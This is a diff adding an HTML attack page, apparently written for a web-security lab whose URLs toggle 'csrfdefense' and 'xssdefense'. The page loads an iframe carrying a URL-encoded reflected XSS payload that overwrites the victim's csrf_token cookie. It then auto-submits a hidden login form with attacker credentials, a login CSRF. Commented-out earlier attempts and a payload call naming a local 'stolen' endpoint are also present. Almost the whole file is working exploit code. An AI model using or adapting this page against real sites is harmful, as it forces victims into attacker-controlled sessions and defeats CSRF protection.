@@ -1,0 +1,36 @@
+<meta charset="utf-8">
+<html>
+  <body>
+    <!--<iframe id="iframe" src="http://permalink.co:8080/login?csrfdefense=0&xssdefense=5" width="0" height="0" onload="read()"></iframe>-->
+
+    <!--<form action="http://permalink.co:8080/login?csrfdefense=1&xssdefense=0" method="post" id ="login_info"> ="aaaaa"; alert("aaa") -->
+    <!--<iframe id="iframe" src="http://permalink.co:8080/?csrfdefense=1&xssdefense=0&q=<script>document.getElementsByName("csrf_token")[0].value="aaaaa"</script>" width="500" height="500"></iframe>-->
+    <iframe id="iframe" src="http://permalink.co:8080/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%20%20%20%20%2F%2Fdocument.getElementsByName(%22csrf_token%22)%5B0%5D.value%20%3D1%20%3B%0A%20%20%20%20%2F%2Fvar%20tokenvalue%20%3D%20document.getElementsByName(%22csrf_token%22)%5B0%5D.val()%3B%0A%20%20%20%20function%20getCookie(cname)%20%7B%0A%20%20%20%20var%20name%20%3D%20cname%20%2B%20%22%3D%22%3B%0A%20%20%20%20var%20ca%20%3D%20document.cookie.split(%27%3B%27)%3B%0A%20%20%20%20for(var%20i%3D0%3B%20i%3Cca.length%3B%20i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20var%20c%20%3D%20ca%5Bi%5D%3B%0A%20%20%20%20%20%20%20%20while%20(c.charAt(0)%3D%3D%27%20%27)%20c%20%3D%20c.substring(1)%3B%0A%20%20%20%20%20%20%20%20if%20(c.indexOf(name)%20%3D%3D%200)%20return%20c.substring(name.length%2Cc.length)%3B%0A%20%20%20%20%7D%0A%20%20%20%20return%20%22%22%3B%0A%20%20%20%20%7D%0A%20%20%20%20function%20checkCookie()%20%7B%0A%20%20%20%20var%20username%3DgetCookie(%22csrf_token%22)%3B%0A%20%20%20%20if%20(username!%3D%22%22)%20%7B%0A%20%20%20%20%20%20%20%20alert(%22csrf_token%20Changed%20to%20%22%20%2B%20username)%3B%0A%20%20%20%20%7D%7D%0A%20%20%20%20function%20setCookie(cname%2C%20cvalue%2C%20exdays)%20%7B%0A%20%20%20%20%20%20%20%20var%20d%20%3D%20new%20Date()%3B%0A%20%20%20%20%20%20%20%20d.setTime(d.getTime()%20%2B%20(exdays*24*60*60*1000))%3B%0A%20%20%20%20%20%20%20%20var%20expires%20%3D%20%22expires%3D%22%2Bd.toUTCString()%3B%0A%20%20%20%20%20%20%20%20document.cookie%20%3D%20cname%20%2B%20%22%3D%22%20%2B%20cvalue%20%2B%20%22%3B%20%22%20%2B%20expires%3B%0A%20%20%20%20%7D%0A%20%20%20%20setCookie(%22csrf_token%22%2C1%2C1)%0A%20%20%20%20checkCookie()%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%3C%2Fscript%3E" width="500" height="500"></iframe>
+
+    <form action="http://permalink.co:8080/login?csrfdefense=1&xssdefense=0" method="post" id ="login_info">
+    <input type="hidden" name="username" value="attacker"><br>
+    <input type="hidden" name="password" value="l33th4x"><br>
+    <input type="hidden" name="csrf_token" value="aa"><br>
+    </form>
+
+    <script>
+    //  function read(){
+    //  alert(document.getElementById("iframe").contentDocument.forms[0].token.value);
+    //  var username = "attacker";
+    //  var password = "l33th4x";
+    //  var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
+    //  document.writeln('<input type="hidden" name="token" value="' + token + '" />');
+    //  csrfdefense=1&xssdefense=0&
+
+    //  }
+    // alert("HAHAH");
+    // $.post( "http://permalink.co:8080/login?csrfdefense=1&xssdefense=0", { username: attacker, password: l33th4x, csrf_token: aaaaa});
+    /*$(document).ready(function() {
+      alert("III");
+    });*/
+    document.getElementById("login_info").submit();
+    </script>
+
+
+</body>
+</html>
